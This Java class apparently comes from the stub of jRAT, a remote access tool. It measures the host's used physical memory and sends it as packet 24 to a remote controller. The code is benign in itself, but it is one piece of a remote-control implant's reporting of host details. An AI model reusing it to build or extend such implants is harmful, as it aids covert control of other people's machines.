package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;
import java.lang.management.ManagementFactory;

import se.jrat.common.io.StringWriter;

import com.sun.management.OperatingSystemMXBean;


public class Packet24UsedMemory extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		long total = ((OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize();
		long free = ((OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getFreePhysicalMemorySize();

		dos.writeLong(total - free);
	}

	@Override
	public byte getPacketId() {
		return 24;
	}

}
